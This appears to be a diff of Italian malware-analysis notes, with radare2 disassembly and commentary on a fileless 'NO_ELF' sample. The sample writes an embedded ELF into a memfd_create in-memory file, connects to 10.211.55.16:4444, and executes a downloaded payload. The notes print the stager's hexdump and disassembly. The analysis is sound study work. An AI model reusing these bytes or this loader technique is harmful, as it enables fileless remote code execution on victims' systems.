@@ -234,32 +234,17 @@ NO_ELF
 0x0040088e mov eax, 0
 0x00400893 call sym.imp.syscall
 
-;319 è il numero della syscall per memfd_create. Questo blocco di codice sta
-creando un file in memoria chiamato "no_elf" utilizzando la syscall memfd_create 
-con il flag impostato a 1. Il file descriptor risultante dalla chiamata sarà 
-restituito, consentendo di utilizzare il file in memoria per scopi specifici, 
-come l'interprocess communication o la memorizzazione temporanea dei dati.
+;319 è il numero della syscall per memfd_create. Questo blocco di codice sta creando un file in memoria chiamato "no_elf" utilizzando la syscall memfd_create con il flag impostato a 1. Il file descriptor risultante dalla chiamata sarà restituito, consentendo di utilizzare il file in memoria per scopi specifici, come l'interprocess communication o la memorizzazione temporanea dei dati.
 
 ;la syscall è memfd_create (numero 319).
 ;il nome del file in memoria è "no_elf", passato tramite esi.
 ;il flag è 1, passato tramite edx.
 
-;il risultato della syscall darà un file descriptor che può essere utilizzato
-per accedere al file in memoria creato. Quando viene chiamata la syscall
-memfd_create (numero 319) e impostato il flag a 1 (passato tramite il registro
-edx), significa che si sta attivando l'opzione MFD_CLOEXEC. Se il processo crea
-un nuovo programma con exec(), il file descriptor non sarà ereditato dal nuovo
-processo. Questo è utile per evitare che file aperti non necessari vengano
-ereditati, aumentando così la sicurezza ed evitando la condivisione accidentale
-di risorse tra processi.
+;il risultato della syscall darà un file descriptor che può essere utilizzato per accedere al file in memoria creato. Quando viene chiamata la syscall memfd_create (numero 319) e impostato il flag a 1 (passato tramite il registro edx), significa che si sta attivando l'opzione MFD_CLOEXEC. Se il processo crea un nuovo programma con exec(), il file descriptor non sarà ereditato dal nuovo processo. Questo è utile per evitare che file aperti non necessari vengano ereditati, aumentando così la sicurezza ed evitando la condivisione accidentale di risorse tra processi.
 
-;la metà della metà della metà, i numeri periodici, l’inesprimibile piccolezza
-delle micro- particelle atomiche: se rimpicciolissimo le matrioske contenute
-l’una dentro l’altra all’infinito, incapperemmo nell’idea di infinitamente
-piccolo, microscopico.
+;la metà della metà della metà, i numeri periodici, l’inesprimibile piccolezza delle micro- particelle atomiche: se rimpicciolissimo le matrioske contenute l’una dentro l’altra all’infinito, incapperemmo nell’idea di infinitamente piccolo, microscopico.
 
-;oggi non sono in vena di fare battute, ma non preoccupatevi: ho una vasta
-collezione di sguardi perplessi da esibire!
+;oggi non sono in vena di fare battute, ma non preoccupatevi: ho una vasta collezione di sguardi perplessi da esibire!
 
 0x00400898 mov dword [fd], eax
 0x0040089b mov eax, dword [fd]
@@ -268,15 +253,9 @@ collezione di sguardi perplessi da esibire!
 0x004008a8 mov edi, eax ; int fd
 0x004008aa call sym.imp.write ; ssize_t write(int fd, const char *ptr, size_t nbytes)
 
-;ottiene il file descriptor del file creato in memoria e va a scriverci 256
-byte presenti in questa locazione di memoria 0x400988, che si riferisce a una
-parte della sezione .rodata.
+;ottiene il file descriptor del file creato in memoria e va a scriverci 256 byte presenti in questa locazione di memoria 0x400988, che si riferisce a una parte della sezione .rodata.
 
-;il blocco di dati di 256 byte che inizia con un header ELF valido e include i
-vari campi e le informazioni necessari per identificare e utilizzare il file
-eseguibile ELF. È fondamentale che la sequenza di byte e i loro valori siano
-coerenti con le specifiche del formato ELF, il che sembra essere il caso in
-questa situazione.
+;il blocco di dati di 256 byte che inizia con un header ELF valido e include i vari campi e le informazioni necessari per identificare e utilizzare il file eseguibile ELF. È fondamentale che la sequenza di byte e i loro valori siano coerenti con le specifiche del formato ELF, il che sembra essere il caso in questa situazione.
 
 0x004008af lea rdx, [var_10h]
 0x004008b3 lea rcx, [var_20h]
@@ -299,10 +278,7 @@ questa situazione.
 
 ;controllo del canarino sullo stack
 
-;ugualmente, possiamo invertire il senso di apertura della bambola e
-prolungarla all’infinito verso la grandezza. Qualcosa di grande che è sua volta
-è contenuto da qualcosa di più grande, ad libitum.
-;libidine, doppia libidine, libidine con i fiocchi!
+;ugualmente, possiamo invertire il senso di apertura della bambola e prolungarla all’infinito verso la grandezza. Qualcosa di grande che è sua volta è contenuto da qualcosa di più grande, ad libitum. libidine, doppia libidine, libidine con i fiocchi!
 
 0x004008e9 leave
 0x004008ea ret
@@ -314,10 +290,7 @@ prolungarla all’infinito verso la grandezza. Qualcosa di grande che è sua vol
 ;file extracted_rodata.bin
 ;r2 ./extracted_rodata.bin
 
-;comandi per estrarre dalla sezione .rodata del malware, il file elf da 256
-byte.
-;all'interno della matrioska non c'era un'altra matrioska, ma un elf che si
-chiama no_elf. Come un vaccinato no vax o un promoter della Nike no global.
+;comandi per estrarre dalla sezione .rodata del malware, il file elf da 256 byte.  ;all'interno della matrioska non c'era un'altra matrioska, ma un elf che si chiama no_elf. Come un vaccinato no vax o un promoter della Nike no global.
 
 [0x00400806]> px 256 @ 0x400988
 - offset - 8889 8A8B 8C8D 8E8F 9091 9293 9495 9697 89ABCDEF01234567
@@ -338,8 +311,7 @@ chiama no_elf. Come un vaccinato no vax o un promoter della Nike no global.
 0x00400a68 4885 c079 c76a 3c58 6a01 5f0f 055e 6a26 H..y.j<xj._..^j&
 0x00400a78 5a0f 0548 85c0 78ed ffe6 0000 011b 033b Z..H..x........;
 
-;ecco il disassemblato del file elf estratto dalla sezione .rodata del
-malware.
+;ecco il disassemblato del file elf estratto dalla sezione .rodata del malware.
 
 [0x00400078]> pdf
 ;-- rip:
@@ -410,13 +382,10 @@ gestore di errori.
 
 ;42 sys_connect int fd struct sockaddr *uservaddr int addrlen
 ;qui il codice si prepara per la chiamata connect() per collegarsi
-all'indirizzo IP 10.211.55.16 sulla porta 4444, come abbiamo discusso in
-precedenza.
-;0x1037d30a5c11 115c è 4444, mentro l'ip 0a (10) d3 (211) 37 (55) 10 (16),
-essendo in little endian.
+all'indirizzo IP 10.211.55.16 sulla porta 4444, come abbiamo discusso in precedenza.
+;0x1037d30a5c11 115c è 4444, mentro l'ip 0a (10) d3 (211) 37 (55) 10 (16), essendo in little endian.
 ;0x02: Questo rappresenta sin_family, che indica la famiglia dell'indirizzo.
-Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in
-decimal (quindi 0x02 in hex).
+Per i socket IPv4, sin_family è comunemente impostato a AF_INET, che è 2 in decimal (quindi 0x02 in hex).
 
 0x004000c2 pop rcx
 0x004000c3 test rax, rax
@@ -464,17 +433,9 @@ riprova a connettersi.
 0x004000f0 pop rdx
 0x004000f1 syscall
 
-;viene la read passandogli l'indirizzo in rsi (che è la cima dello stack) come
-buffer; in rdi abbiamo l'fd aperto, poi con jmp rsi si va ad eseguire proprio
-quei 38 byte appena scaricati.
-;la sequenza di chiamate di sistema porta alla lettura di un payload remoto e
-alla sua esecuzione. Se ci sono errori durante la lettura, il codice esegue un
-salto a un gestore di errori. Ma se tutto va a buon fine, il codice scaricato
-verrà eseguito, consentendo al potenziale attaccante di controllare il
-sistema.
+;viene la read passandogli l'indirizzo in rsi (che è la cima dello stack) come buffer; in rdi abbiamo l'fd aperto, poi con jmp rsi si va ad eseguire proprio quei 38 byte appena scaricati. la sequenza di chiamate di sistema porta alla lettura di un payload remoto e alla sua esecuzione. Se ci sono errori durante la lettura, il codice esegue un salto a un gestore di errori. Ma se tutto va a buon fine, il codice scaricato verrà eseguito, consentendo al potenziale attaccante di controllare il sistema.
 
-;gestire gli errori? È facile! Basta ignorarli finché non diventano abbastanza
-grandi da invitarti a cena!
+;gestire gli errori? È facile! Basta ignorarli finché non diventano abbastanza grandi da invitarti a cena!
 
 0x004000f3 test rax, rax
 0x004000f6 js 0x4000e5
